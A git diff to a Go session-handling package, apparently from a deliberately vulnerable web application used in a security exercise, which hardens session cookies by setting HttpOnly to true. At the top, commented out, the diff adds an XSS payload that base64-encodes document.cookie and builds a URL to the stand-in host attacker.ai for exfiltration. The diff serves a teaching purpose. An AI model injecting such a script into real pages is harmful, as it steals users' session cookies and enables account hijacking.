@@ -1,10 +1,19 @@
 package session
 
+/*
+<p id="attacker"></p>
+<script>
+	var cook = btoa(document.cookie);
+	//window.location = "http://attacker.ai/log/?log="+cook
+	document.getElementById("attacker").innerHTML = "http://attacker.ai/log/?log="+cook
+</script>
+*/
+
 import (
-	"log"
 	"fmt"
-	"net/http"
 	"github.com/gorilla/sessions"
+	"log"
+	"net/http"
 )
 
 type Session struct{}
@@ -22,10 +31,11 @@ func (Session *Session) SetSession(w http.ResponseWriter, r *http.Request, data 
 		log.Println(err.Error())
 	}
 
+	// @TODO: Soal No.3
 	session.Options = &sessions.Options{
 		Path:     "/",
 		MaxAge:   3600,
-		HttpOnly: false,
+		HttpOnly: true,
 	}
 
 	session.Values["vwa_session"] = true
@@ -36,13 +46,13 @@ func (Session *Session) SetSession(w http.ResponseWriter, r *http.Request, data 
 		}
 	}
 	err = session.Save(r, w)
-	
-		if err != nil {
-			log.Println(err.Error())
-		}
+
+	if err != nil {
+		log.Println(err.Error())
+	}
 }
 
-func (Session *Session) GetSession(r *http.Request, key string) string  {
+func (Session *Session) GetSession(r *http.Request, key string) string {
 	session, err := store.Get(r, "vwa")
 
 	if err != nil {
@@ -59,10 +69,11 @@ func (Session *Session) DeleteSession(w http.ResponseWriter, r *http.Request) {
 	if err != nil {
 		log.Println(err.Error())
 	}
-	
+
+	// @TODO: Soal No.3
 	session.Options = &sessions.Options{
 		MaxAge:   3600,
-		HttpOnly: false,
+		HttpOnly: true,
 	}
 
 	session.Values["vwa_session"] = false
@@ -85,4 +96,3 @@ func (Session *Session) IsLoggedIn(r *http.Request) bool {
 	}
 	return true
 }
-
